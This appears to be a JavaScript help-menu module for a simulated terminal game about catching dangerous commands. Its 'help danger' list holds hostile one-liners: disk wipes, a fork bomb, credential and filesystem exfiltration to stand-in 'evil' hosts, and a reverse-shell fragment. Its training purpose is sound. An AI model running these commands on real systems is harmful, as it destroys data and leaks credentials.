export const helpCommands = [

  {
    match: cmd => cmd === 'help' || cmd === 'help 1',
    handler: async (cmd, { term }) => {
      term.addLine('', 'blank');
      term.addLine('COMMANDS — Page 1/3 (type "help 2" or "help 3")', 'about-heading');
      term.addLine('', 'blank');
      term.addLine('  ── GAME ──', 'about-heading');
      const game = [
        ['play', 'Start the game (or press Enter)'],
        ['play <n>', 'Start with n terminals (1-4)'],
        ['tutorial', 'Practice mode'],
        ['terminals <n>', 'Set terminal count for next game'],
        ['leaderboard', 'Full scoreboard (top 10)'],
        ['stats', 'Global leaderboard statistics'],
        ['achievements', 'View unlocked achievements'],
        ['team', 'The people behind the madness'],
        ['credits', 'Rolling credits'],
        ['man pshell', 'Game manual page'],
      ];
      for (const [c, d] of game) term.addLine(`  ${c.padEnd(16)} ${d}`, 'about-text');
      term.addLine('', 'blank');
      term.addLine('  ── HACKING ──', 'about-heading');
      const hacking = [
        ['hack', 'Hack the mainframe'],
        ['nmap', 'Scan for open ports'],
        ['matrix', 'Enter the Matrix'],
        ['cat secrets.enc', 'Try to decrypt secrets'],
      ];
      for (const [c, d] of hacking) term.addLine(`  ${c.padEnd(16)} ${d}`, 'about-text');
      term.addLine('', 'blank');
      term.addLine('Pages: help 2 (system) | help 3 (fun)', 'about-access');
      term.addLine('Deep:  help rm | sudo | cat | git | npm | docker', 'about-access');
      term.addLine('       help k8s | db | infra | kill | network | fs', 'about-access');
      term.addLine('       help system | danger | easter | help help', 'about-access');
      term.addLine('', 'blank');
    },
  },

  {
    match: 'help 2',
    handler: async (cmd, { term }) => {
      term.addLine('', 'blank');
      term.addLine('COMMANDS — Page 2/3 (type "help 1" or "help 3")', 'about-heading');
      term.addLine('', 'blank');
      term.addLine('  ── SYSTEM ──', 'about-heading');
      const sys = [
        ['neofetch', 'System info with ASCII art'],
        ['top / htop', 'Running processes'],
        ['free', 'Memory usage'],
        ['df', 'Disk usage'],
        ['uptime', 'System uptime'],
        ['uname', 'Kernel info'],
        ['whoami', 'Current user'],
        ['id', 'User & group IDs'],
        ['w', 'Who is logged in'],
        ['hostname', 'Machine name'],
        ['date', 'Current date/time'],
        ['pwd', 'Working directory'],
        ['history', 'Command history'],
        ['passwd', 'Change password'],
        ['screen / tmux', 'Terminal multiplexer'],
        ['which <cmd>', 'Locate a command'],
        ['mv / cp', 'Move/copy files (read-only)'],
      ];
      for (const [c, d] of sys) term.addLine(`  ${c.padEnd(16)} ${d}`, 'about-text');
      term.addLine('', 'blank');
      term.addLine('  ── NETWORK ──', 'about-heading');
      const net = [
        ['ping <host>', 'Ping a server'],
        ['curl <url>', 'Fetch a URL'],
        ['traceroute', 'Trace network path'],
        ['nmap', 'Scan for open ports'],
        ['docker ps', 'Running containers'],
        ['netmap', 'Network topology map'],
      ];
      for (const [c, d] of net) term.addLine(`  ${c.padEnd(16)} ${d}`, 'about-text');
      term.addLine('', 'blank');
      term.addLine('  ── PACKAGES ──', 'about-heading');
      const pkg = [
        ['npm install', 'Install node packages'],
        ['npm test', 'Run test suite'],
        ['npm run build', 'Build the project'],
        ['npm audit', 'Security audit'],
        ['pip install', 'Install Python packages'],
        ['apt install', 'Install system packages'],
        ['cargo build', 'Build Rust project'],
      ];
      for (const [c, d] of pkg) term.addLine(`  ${c.padEnd(16)} ${d}`, 'about-text');
      term.addLine('', 'blank');
    },
  },

  {
    match: 'help 3',
    handler: async (cmd, { term }) => {
      term.addLine('', 'blank');
      term.addLine('COMMANDS — Page 3/3 (type "help 1" or "help 2")', 'about-heading');
      term.addLine('', 'blank');
      term.addLine('  ── FUN ──', 'about-heading');
      const fun = [
        ['fortune', 'Random programming wisdom'],
        ['cowsay <msg>', 'ASCII cow says your message'],
        ['sl', 'Steam locomotive'],
        ['echo <msg>', 'Echo a message'],
        ['matrix', 'Enter the Matrix'],
        ['make', 'Compile the game'],
        ['python / python3', 'Python interpreter'],
        ['42', 'The answer'],
        ['snake', 'Classic snake game'],
        ['2048', 'Play the 2048 puzzle game'],
        ['minesweeper', 'Classic minesweeper game'],
        ['wordle', 'Guess the tech word'],
      ];
      for (const [c, d] of fun) term.addLine(`  ${c.padEnd(16)} ${d}`, 'about-text');
      term.addLine('', 'blank');
      term.addLine('  ── FILES ──', 'about-heading');
      const files = [
        ['ls', 'List files'],
        ['cat <file>', 'Read a file'],
        ['grep <pat> [file]', 'Search text'],
        ['wc [file]', 'Count lines/words/chars'],
        ['sort / uniq', 'Sort or deduplicate lines'],
        ['head / tail', 'First/last lines'],
        ['download <file>', 'Download to your computer'],
        ['env', 'Environment variables'],
        ['export VAR=val', 'Set environment variable'],
        ['ps aux', 'Process list'],
        ['git log', 'Commit history'],
        ['pg_dump', 'Export database as SQL'],
      ];
      for (const [c, d] of files) term.addLine(`  ${c.padEnd(16)} ${d}`, 'about-text');
      term.addLine('', 'blank');
      term.addLine('  ── META ──', 'about-heading');
      const meta = [
        ['clear', 'Clear terminal'],
        ['exit', 'Disconnect from server'],
        ['rm -rf /', 'You wouldn\'t dare'],
        ['sudo', 'Elevate privileges'],
        ['vim / nano', 'Open an editor'],
        ['reboot', 'Restart the server'],
        ['hello', 'Say hi'],
      ];
      for (const [c, d] of meta) term.addLine(`  ${c.padEnd(16)} ${d}`, 'about-text');
      term.addLine('', 'blank');
      term.addLine('Plus hidden easter eggs. Good luck.', 'about-access');
      term.addLine('', 'blank');
    },
  },

  // ─── Command-specific help ───

  {
    match: 'help rm',
    handler: async (cmd, { term, state }) => {
      term.addLine('', 'blank');
      term.addLine('RM — Remove files (the fun part)', 'about-heading');
      term.addLine('', 'blank');
      const cmds = [
        ['rm -rf /', 'Delete everything. Has 10+ responses.'],
        ['rm -rf /home', 'Evict all users'],
        ['rm -rf /boot', 'Brick the server permanently'],
        ['rm -rf /etc', 'Erase all configuration'],
        ['rm -rf /var/log', 'Cover your tracks'],
        ['rm -rf /tmp', 'Delete the already-temporary'],
        ['rm -rf .git', 'Destroy version history'],
        ['rm -rf /usr', 'Remove all programs (incl. rm)'],
        ['rm -rf /dev', 'Delete device files'],
        ['rm -rf /proc', 'Delete virtual filesystem'],
        ['rm -rf /dev/null', 'Void the void'],
        ['rm -rf node_modules', 'The JavaScript ritual (animated)'],
        ['rm -rf ~', 'Homeless server'],
        ['rm <file>', 'Read-only, always fails'],
      ];
      for (const [c, d] of cmds) term.addLine(`  ${c.padEnd(22)} ${d}`, 'about-text');
      term.addLine('', 'blank');
      term.addLine('Pro tip: rm -rf / tracks your attempts.', 'about-access');
      term.addLine('Current count: ' + (state.rmCount || 0), 'about-access');
      term.addLine('', 'blank');
    },
  },

  {
    match: 'help sudo',
    handler: async (cmd, { term, state }) => {
      term.addLine('', 'blank');
      term.addLine('SUDO — Superuser Do (or don\'t)', 'about-heading');
      term.addLine('', 'blank');
      const cmds = [
        ['sudo <anything>', '10+ escalating responses'],
        ['sudo su / sudo -i', 'Double root inception'],
        ['sudo rm -rf /', 'The nuclear option'],
        ['sudo make me a sandwich', 'The xkcd classic'],
        ['sudo !!', 'Repeat last cmd as root'],
        ['sudo shutdown now', 'Try to kill a browser tab'],
        ['sudo apt update', 'Fake package update'],
        ['sudo apt upgrade', 'Upgrade patience (fails)'],
        ['sudo visudo', 'View sudoers file'],
        ['sudo reboot', 'Spoiler: it doesn\'t'],
      ];
      for (const [c, d] of cmds) term.addLine(`  ${c.padEnd(28)} ${d}`, 'about-text');
      term.addLine('', 'blank');
      term.addLine('Current sudo attempts: ' + (state.sudoCount || 0), 'about-access');
      term.addLine('', 'blank');
    },
  },

  {
    match: 'help cat',
    handler: async (cmd, { term }) => {
      term.addLine('', 'blank');
      term.addLine('CAT — Read files (all of them)', 'about-heading');
      term.addLine('', 'blank');
      const cmds = [
        ['cat README.md', 'Game readme'],
        ['cat notes.txt', 'Developer TODO list'],
        ['cat todo.md', 'Sprint 47 (12 sprints overdue)'],
        ['cat secrets.enc', 'Encrypted secrets (access denied)'],
        ['cat team.dat', 'Binary team data'],
        ['cat about.classified', 'Meta file inception'],
        ['cat .bash_history', 'Command history with paranoia'],
        ['cat .ssh/id_rsa', 'Private key (DON\'T do this IRL)'],
        ['cat /etc/passwd', 'System user list'],
        ['cat /etc/shadow', 'Password hashes'],
        ['cat /etc/hosts', 'DNS with focus mode blocks'],
        ['cat /etc/motd', 'Message of the day'],
        ['cat /proc/cpuinfo', 'CPU info with "vibes" flag'],
        ['cat /proc/version', 'Kernel version'],
        ['cat /proc/loadavg', 'Load averages (nice numbers)'],
        ['cat /root/DO_NOT_READ.txt', 'Letter from the last engineer'],
        ['cat /tmp/.secret_note', 'Hidden secret with passwords'],
      ];
      for (const [c, d] of cmds) term.addLine(`  ${c.padEnd(28)} ${d}`, 'about-text');
      term.addLine('', 'blank');
    },
  },

  {
    match: 'help npm',
    handler: async (cmd, { term }) => {
      term.addLine('', 'blank');
      term.addLine('NPM — Node Package Manager', 'about-heading');
      term.addLine('', 'blank');
      const cmds = [
        ['npm install', 'Install packages (animated)'],
        ['npm test', 'Run tests (1 fails)'],
        ['npm run build', 'Vite build output'],
        ['npm audit', 'Security vulnerability report'],
        ['npm publish', 'Publish package (blocked)'],
        ['npm install happiness', 'Package not found'],
      ];
      for (const [c, d] of cmds) term.addLine(`  ${c.padEnd(24)} ${d}`, 'about-text');
      term.addLine('', 'blank');
    },
  },

  {
    match: 'help git',
    handler: async (cmd, { term }) => {
      term.addLine('', 'blank');
      term.addLine('GIT — Version control (15 commands)', 'about-heading');
      term.addLine('', 'blank');
      const cmds = [
        ['git status', 'Working tree status (stateful)'],
        ['git add <file> / .', 'Stage files (stateful)'],
        ['git commit -m "msg"', 'Commit staged changes'],
        ['git log', 'Commit history (per branch)'],
        ['git diff', 'Show file changes (multi-line)'],
        ['git blame', 'Who wrote this (Claude)'],
        ['git branch / -a', 'List branches'],
        ['git checkout <branch>', 'Switch branch'],
        ['git checkout -b <name>', 'Create & switch branch'],
        ['git stash / list / pop', 'Stash management'],
        ['git push / pull', 'Push/pull from remote'],
        ['git push --force', 'Force push (dangerous!)'],
        ['git reset --hard', 'Destroy uncommitted work'],
        ['git clean -fdx', 'Remove all untracked files'],
        ['git remote -v', 'Show remotes'],
      ];
      for (const [c, d] of cmds) term.addLine(`  ${c.padEnd(24)} ${d}`, 'about-text');
      term.addLine('', 'blank');
    },
  },

  {
    match: 'help kill',
    handler: async (cmd, { term }) => {
      term.addLine('', 'blank');
      term.addLine('KILL — Send signals to processes', 'about-heading');
      term.addLine('', 'blank');
      const cmds = [
        ['kill -9 1', 'Kill init (kernel panic)'],
        ['kill -9 -1', 'Kill ALL processes'],
        ['kill $$', 'Kill your own shell'],
        ['kill <pid>', 'Send SIGTERM to a process'],
        ['killall <name>', 'Kill by process name'],
      ];
      for (const [c, d] of cmds) term.addLine(`  ${c.padEnd(24)} ${d}`, 'about-text');
      term.addLine('', 'blank');
    },
  },

  {
    match: 'help network',
    handler: async (cmd, { term }) => {
      term.addLine('', 'blank');
      term.addLine('NETWORK — Networking commands', 'about-heading');
      term.addLine('', 'blank');
      const cmds = [
        ['ping <host>', '4 pings with random latency'],
        ['curl <url>', 'HTTP request with headers'],
        ['curl <container>', 'DNS-aware container curl'],
        ['wget <url>', 'Download (blocks malware)'],
        ['traceroute <host>', 'Trace with classified hops'],
        ['nmap', 'Port scan (finds port 31337)'],
        ['ssh <host>', 'SSH (prod refuses you)'],
        ['ssh 31337', 'Connect to hidden service'],
        ['ifconfig / ip addr', 'Network interfaces'],
        ['netstat / ss', 'Listening ports'],
        ['dig <host>', 'DNS lookup'],
        ['nslookup <host>', 'DNS query'],
        ['iptables -L', 'View firewall rules'],
        ['iptables -F', 'Drop firewall (blocked)'],
        ['netmap', 'Network topology visualizer'],
      ];
      for (const [c, d] of cmds) term.addLine(`  ${c.padEnd(24)} ${d}`, 'about-text');
      term.addLine('', 'blank');
    },
  },

  {
    match: cmd => cmd === 'help fs' || cmd === 'help filesystem',
    handler: async (cmd, { term, state }) => {
      term.addLine('', 'blank');
      term.addLine('FILESYSTEM — Navigate the server', 'about-heading');
      term.addLine('', 'blank');
      const cmds = [
        ['cd <dir>', 'Change directory'],
        ['cd ..', 'Go up one level'],
        ['cd ~', 'Go home'],
        ['ls / ls -la', 'List files (with details)'],
        ['cat <file>', 'Read a file (see: help cat)'],
        ['touch <file>', 'Create empty file (in ~, /tmp)'],
        ['mkdir <dir>', 'Create directory (in ~, /tmp)'],
        ['echo "x" > file', 'Write text to file'],
        ['echo "x" >> file', 'Append text to file'],
        ['rm <file>', 'Delete user-created files'],
        ['grep <pattern>', 'Search (try: error, password, TODO)'],
        ['find . -name "*.log"', 'Find log files'],
        ['head/tail <file>', 'View beginning/end of file'],
      ];
      for (const [c, d] of cmds) term.addLine(`  ${c.padEnd(24)} ${d}`, 'about-text');
      term.addLine('', 'blank');
      term.addLine('Current directory: ' + state.cwd, 'about-access');
      term.addLine('', 'blank');
    },
  },

  {
    match: 'help system',
    handler: async (cmd, { term }) => {
      term.addLine('', 'blank');
      term.addLine('SYSTEM — System administration', 'about-heading');
      term.addLine('', 'blank');
      const cmds = [
        ['ps aux', 'Full process list (stateful)'],
        ['top / htop', 'Process monitor'],
        ['env', 'Environment variables'],
        ['free / df', 'Memory / disk usage'],
        ['dmesg', 'Kernel messages'],
        ['journalctl', 'Service logs'],
        ['systemctl status <s>', 'Service status (stateful)'],
        ['systemctl stop <s>', 'Stop service (stateful)'],
        ['systemctl start <s>', 'Start service (stateful)'],
        ['service <s> start/stop', 'SysV init (stateful)'],
        ['crontab -l', 'Scheduled jobs (stateful)'],
        ['crontab -r', 'Delete all cron jobs'],
        ['cat /etc/passwd', 'User list'],
        ['alias', 'View command aliases'],
        ['last', 'Login history'],
      ];
      for (const [c, d] of cmds) term.addLine(`  ${c.padEnd(28)} ${d}`, 'about-text');
      term.addLine('', 'blank');
    },
  },

  {
    match: cmd => cmd === 'help danger' || cmd === 'help dangerous',
    handler: async (cmd, { term }) => {
      term.addLine('', 'blank');
      term.addLine('DANGEROUS — Commands the game trains you to catch', 'about-heading');
      term.addLine('', 'blank');
      const cmds = [
        ['rm -rf /', 'Delete everything'],
        ['dd if=/dev/zero of=/dev/sda', 'Overwrite disk with zeros'],
        [':(){ :|:& };:', 'Fork bomb'],
        ['> /etc/passwd', 'Truncate user file'],
        ['chmod 777 /', 'Open all permissions'],
        ['kill -9 1', 'Kill init (kernel panic)'],
        ['git push --force', 'Overwrite shared history'],
        ['kubectl delete ns prod', 'Delete prod namespace'],
        ['DROP DATABASE production', 'Delete entire database'],
        ['scp ~/.aws evil.test:', 'Exfiltrate credentials'],
        ['nohup bash -i >& /dev/tcp', 'Reverse shell'],
        ['sed -i sshd_config', 'Weaken SSH security'],
        ['openssl enc shadow', 'Encrypt for exfiltration'],
        ['npm publish --access public', 'Leak private code'],
        ['crontab -r', 'Delete all cron jobs'],
        ['halt -f', 'Force halt (no sync)'],
        ['chown root:root /', 'Change ownership recursively'],
        ['mkfs /dev/sda', 'Format disk'],
        ['shred /dev/sda', 'Destroy disk data'],
        ['swapoff -a', 'Disable swap (OOM risk)'],
        ['pkill -9 -u root', 'Kill all root processes'],
        ['ufw disable', 'Disable firewall'],
        ['poweroff', 'Shut down immediately'],
        ['rsync / evil:', 'Exfiltrate filesystem'],
      ];
      for (const [c, d] of cmds) term.addLine(`  ${c.padEnd(32)} ${d}`, 'about-text');
      term.addLine('', 'blank');
      term.addLine('All of these are playable in the about CLI.', 'about-access');
      term.addLine('Try them and see what happens.', 'about-access');
      term.addLine('', 'blank');
    },
  },

  {
    match: cmd => cmd === 'help easter' || cmd === 'help eggs' || cmd === 'help easter eggs',
    handler: async (cmd, { term }) => {
      term.addLine('', 'blank');
      term.addLine('EASTER EGGS — You want hints? Fine.', 'about-heading');
      term.addLine('', 'blank');
      term.addLine('  - Try rm -rf / multiple times', 'about-text');
      term.addLine('  - Try sudo multiple times', 'about-text');
      term.addLine('  - Run nmap, then ssh to what you find', 'about-text');
      term.addLine('  - Read every file in /root', 'about-text');
      term.addLine('  - Check /tmp for hidden files', 'about-text');
      term.addLine('  - Cat your own .bash_history', 'about-text');
      term.addLine('  - Look at the sudoers file', 'about-text');
      term.addLine('  - Check who else is logged in', 'about-text');
      term.addLine('  - Read the kernel messages', 'about-text');
      term.addLine('  - Try forbidden commands from the game', 'about-text');
      term.addLine('  - Google "xkcd 149"', 'about-text');
      term.addLine('  - Ask about the meaning of life', 'about-text');
      term.addLine('', 'blank');
      term.addLine('That\'s all the hints you get.', 'about-access');
      term.addLine('', 'blank');
    },
  },

  {
    match: cmd => cmd === 'help docker',
    handler: async (cmd, { term }) => {
      term.addLine('', 'blank');
      term.addLine('DOCKER — Container management', 'about-heading');
      term.addLine('', 'blank');
      const cmds = [
        ['docker ps / ps -a', 'List containers (stateful)'],
        ['docker exec -it <c> bash', 'Shell into container'],
        ['docker images', 'Local images'],
        ['docker logs <name>', 'Container logs'],
        ['docker stats', 'Resource usage (live)'],
        ['docker stop <name>', 'Stop container (stateful)'],
        ['docker start <name>', 'Start container (stateful)'],
        ['docker kill <name>', 'Kill container (stateful)'],
        ['docker run', 'Run container (detects escapes)'],
        ['docker network ls', 'List networks'],
        ['docker network inspect', 'Network details with IPs'],
        ['docker network create', 'Create a network'],
        ['docker network rm', 'Remove a network'],
        ['docker volume ls', 'List volumes'],
        ['docker inspect <c>', 'Full container details (JSON)'],
        ['docker inspect --format', 'Go template format query'],
        ['docker events', 'Container event stream'],
        ['docker pause <name>', 'Pause a running container'],
        ['docker unpause <name>', 'Resume a paused container'],
        ['docker update <name>', 'Update container resources'],
        ['docker compose up [-d]', 'Start all compose services'],
        ['docker compose down [-v]', 'Stop & remove services'],
        ['docker compose ps', 'List compose services'],
        ['docker compose logs [svc]', 'Service logs (colored)'],
        ['docker compose restart', 'Restart all services'],
        ['docker compose config', 'Show compose YAML'],
      ];
      for (const [c, d] of cmds) term.addLine(`  ${c.padEnd(26)} ${d}`, 'about-text');
      term.addLine('', 'blank');
    },
  },

  {
    match: cmd => cmd === 'help k8s' || cmd === 'help kubernetes' || cmd === 'help kubectl',
    handler: async (cmd, { term }) => {
      term.addLine('', 'blank');
      term.addLine('KUBERNETES — Cluster management', 'about-heading');
      term.addLine('', 'blank');
      const cmds = [
        ['kubectl get pods', 'List pods (stateful)'],
        ['kubectl get nodes', 'List cluster nodes'],
        ['kubectl get svc', 'List services'],
        ['kubectl delete pod <n>', 'Delete a pod (stateful)'],
        ['kubectl delete pods --all', 'Kill all pods (stateful)'],
        ['kubectl delete ns prod', 'Delete namespace (nuclear)'],
        ['helm list', 'Helm releases (stateful)'],
        ['helm install <n> <chart>', 'Install release (stateful)'],
        ['helm uninstall <name>', 'Uninstall release (stateful)'],
      ];
      for (const [c, d] of cmds) term.addLine(`  ${c.padEnd(24)} ${d}`, 'about-text');
      term.addLine('', 'blank');
    },
  },

  {
    match: cmd => cmd === 'help db' || cmd === 'help database',
    handler: async (cmd, { term }) => {
      term.addLine('', 'blank');
      term.addLine('DATABASES — Data layer', 'about-heading');
      term.addLine('', 'blank');
      const cmds = [
        ['psql', 'PostgreSQL shell (stateful)'],
        ['SELECT * FROM users', 'Query tables'],
        ['SELECT ... WHERE x=y', 'Filter with WHERE'],
        ['INSERT INTO ... VALUES', 'Insert rows (multi-col)'],
        ['UPDATE ... SET ... WHERE', 'Update rows'],
        ['DELETE FROM ... WHERE', 'Delete rows (any column)'],
        ['SELECT col1, col2 FROM t', 'Select specific columns'],
        ['CREATE TABLE t (col type)', 'Create new table'],
        ['DROP TABLE t', 'Drop user tables'],
        ['\\dt / \\d <table>', 'List/describe tables'],
        ['mysql', 'MySQL shell'],
        ['redis-cli', 'Redis shell'],
        ['mongosh', 'MongoDB shell'],
      ];
      for (const [c, d] of cmds) term.addLine(`  ${c.padEnd(24)} ${d}`, 'about-text');
      term.addLine('', 'blank');
    },
  },

  {
    match: cmd => cmd === 'help infra' || cmd === 'help infrastructure',
    handler: async (cmd, { term }) => {
      term.addLine('', 'blank');
      term.addLine('INFRASTRUCTURE — Cloud & IaC', 'about-heading');
      term.addLine('', 'blank');
      const cmds = [
        ['terraform destroy', 'Destroy all infra'],
        ['aws s3 rb/rm', 'Delete S3 buckets'],
        ['aws ec2 terminate', 'Kill EC2 instances'],
        ['aws iam', 'IAM (no permission)'],
      ];
      for (const [c, d] of cmds) term.addLine(`  ${c.padEnd(24)} ${d}`, 'about-text');
      term.addLine('', 'blank');
    },
  },

  {
    match: 'help help',
    handler: async (cmd, { term }) => {
      term.addLine('', 'blank');
      term.addLine('Really? Help on help?', 'about-text');
      term.addLine('', 'blank');
      term.addLine('  help / help 1    Game & hacking commands', 'about-text');
      term.addLine('  help 2           System, network & packages', 'about-text');
      term.addLine('  help 3           Fun, files & meta', 'about-text');
      term.addLine('', 'blank');
      term.addLine('  ── DEEP HELP ──', 'about-heading');
      term.addLine('  help rm          All rm variations (15)', 'about-text');
      term.addLine('  help sudo        All sudo variations (10+)', 'about-text');
      term.addLine('  help cat         All readable files (17)', 'about-text');
      term.addLine('  help git         Git commands (15)', 'about-text');
      term.addLine('  help npm         NPM commands (5)', 'about-text');
      term.addLine('  help docker      Docker commands (8)', 'about-text');
      term.addLine('  help k8s         Kubernetes commands (5)', 'about-text');
      term.addLine('  help db          Database commands (8)', 'about-text');
      term.addLine('  help infra       AWS/Terraform (4)', 'about-text');
      term.addLine('  help kill        Kill variations (5)', 'about-text');
      term.addLine('  help network     Network commands (13)', 'about-text');
      term.addLine('  help fs          Filesystem navigation', 'about-text');
      term.addLine('  help system      System admin commands', 'about-text');
      term.addLine('  help danger      Dangerous command list', 'about-text');
      term.addLine('  help easter      Easter egg hints', 'about-text');
      term.addLine('  help all         Auto-generated full command list', 'about-text');
      term.addLine('', 'blank');
    },
  },

  {
    match: 'help all',
    handler: async (cmd, { term }) => {
      const { COMMANDS } = await import('./index.js');
      const { renderAutoHelp } = await import('./registry.js');
      term.addLine('', 'blank');
      term.addLine('ALL COMMANDS (auto-generated from registry)', 'about-heading');
      term.addLine('', 'blank');
      renderAutoHelp(COMMANDS, term);
      term.addLine('Type "help <topic>" for detailed help.', 'about-access');
      term.addLine('', 'blank');
    },
  },

];
